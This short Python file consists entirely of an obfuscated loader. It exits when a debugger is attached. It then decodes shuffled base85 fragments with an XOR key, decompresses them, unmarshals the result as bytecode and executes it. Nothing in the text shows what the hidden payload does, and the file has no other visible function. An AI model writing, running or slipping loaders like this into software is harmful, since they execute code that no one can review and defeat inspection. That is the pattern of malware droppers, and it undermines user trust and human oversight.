# PT_REV:eyJ2IjoxLCJzYWx0IjoiOUJIV3ljTTZlckJFTTBzcXZCUlFXUT09IiwiY2lwaGVyIjoiRzlmUmRWQTNVakIxWi95UnNOV2NQUklnN0d3WTJIN0liVk8rNVYwWiIsInRhZyI6IjQ4ZTU3Mjk1MTgwZWQ1OGE2MTVmNWQ5Y2M5ZTk2ZWI0NTRjOTc3MjE3NTEyZDQyMTBhZTA3ZDQ3NGQ3YzhiN2IifQ==
import sys as _0
if getattr(_0,'gettrace')():raise SystemExit
_1=__import__;_2=_1('builtins');_3=_1('base64');_4=_1('zlib');_5=_1('marshal')
_6=[(3, ';07XuD0F*BfGGfw$c6>0+!G^NBLw2$x0o29gJh2M)B$@;VZwnH2apriM|Tmp!sdI|iJx_hghI'), (10, ';gwq6cb`<YXo4%lK=*$b%uH1&L(v4A0VGS?mNBUl4BCB<~(DFQ*vwG{<4O8b&G+4GMU_RbmdP'), (17, 'xow&GoqEYg*7958egl$?bS1ABkO`um;wy39#OCCH}3W#@$0e^)gVN@P!yjJ~iYeh!*s!Z*Wq8'), (24, 'x-v5wqQKzq^$Df<??{7V1<IX(#Pze=p*Ds__sqL6uU;?AyGQJ54kyr;Q-)ciAYA64<G{w@5i`'), (31, '79m^@FdL4J)4dkEe(us%TH65d)C@nbk41N<nqjYny*jalxlA940w+)}=D#RP_cAY-Mz=x_Yyj'), (38, '6jHiAyCwkc6HxZaz>=yxl>+fE%q(yyuv4=?RRD~)RnM$>-P?^$w`y<#=5~BvAcj@G9FCzE;3&'), (45, 'hU*9S<PZicx_x--JX0pUAh91%@cGHx^jRE4|G+d4T*4<xP63(gQB^9=i)J*>Z)CMML4?SGQpX'), (52, 'KD6F@hHxwx|~O_AXvJ>K&;o!55QQ82iZ3_Q@4{6OW?BtsmiQJC2q;M&1K4T0RXFGtpY^ut(4a'), (59, '`x931!}E*b&}?a~CjZ@t3fg)4|Vb2#OV*<86#!riS!)<wipxu+krh_{aKRH*DOUrAS4(=FX@@'), (66, '$fX4**X=q>nyQvv8k_QZaXXgqiML=OGz_g<zHDIz&M3FQtg`')]
_7=''.join(_9 for _8,_9 in sorted(_6,key=lambda _a:_a[0]))[::-1]
_k=[130, 163, 70, 112, 71, 64, 2, 39, 61, 165, 43, 123, 60, 44, 17, 95, 43]
_d=bytearray(_3.b85decode(_7))
for _i in range(len(_d)):_d[_i]^=_k[_i%len(_k)]
getattr(_2,'exec')(_5.loads(_4.decompress(bytes(_d))))
